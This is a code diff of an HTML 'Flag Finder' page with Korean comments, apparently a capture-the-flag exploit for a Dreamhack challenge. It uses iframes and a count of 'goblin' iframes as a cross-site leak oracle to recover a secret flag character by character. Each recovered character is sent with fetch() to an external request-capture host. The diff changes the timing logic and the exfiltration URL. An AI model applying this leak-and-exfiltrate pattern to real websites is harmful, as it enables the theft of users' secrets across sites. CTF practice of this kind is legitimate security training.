@@ -6,7 +6,7 @@
     <title>Flag Finder</title>
 </head>
 <body>
-    <h1>Flag Finderㅇㅇ</h1>
+    <h1>Flag Finder</h1>
     <script>
         let server_flag = ''; // 전역 변수
         let previousGoblinCount = 0; // 이전 goblin iframe 개수
@@ -21,21 +21,24 @@
                 iframe.src = requestUrl;
                 document.body.appendChild(iframe);
 
-                // goblin iframe 개수 체크
-                setTimeout(() => {
-                    const goblinIframes = document.querySelectorAll('iframe[id="goblin"]');
-                    const currentGoblinCount = goblinIframes.length;
+                // 100ms 후에 goblin iframe 개수 체크
+                await new Promise(resolve => setTimeout(resolve, 100)); // 100ms 대기
 
-                    if (currentGoblinCount > previousGoblinCount) {
-                        // goblin iframe이 증가했으면, 다음 문자로 넘어감
-                        previousGoblinCount = currentGoblinCount;
-                    } else {
-                        // goblin iframe이 증가하지 않았다면
-                        console.log(`Found flag character: ${flag}`);
-                        const finalRequestUrl = `https://xlduugj.request.dreamhack.games?flag=${encodeURIComponent(flag)}`;
-                        fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
-                    }
-                }, 100); // 100ms 후에 체크 (서버 응답을 기다리기 위함)
+                const goblinIframes = document.querySelectorAll('iframe[id="goblin"]');
+                const currentGoblinCount = goblinIframes.length;
+
+                if (currentGoblinCount > previousGoblinCount) {
+                    // goblin iframe이 증가했으면, 다음 문자로 넘어감
+                    previousGoblinCount = currentGoblinCount;
+                } else {
+                    // goblin iframe이 증가하지 않았다면
+                    console.log(`Found flag character: ${flag}`);
+                    const finalRequestUrl = `https://emadptv.request.dreamhack.games?flag=${encodeURIComponent(flag)}`;
+                    fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
+                }
+
+                // iframe 제거 (옵션)
+                document.body.removeChild(iframe);
             }
         };
 
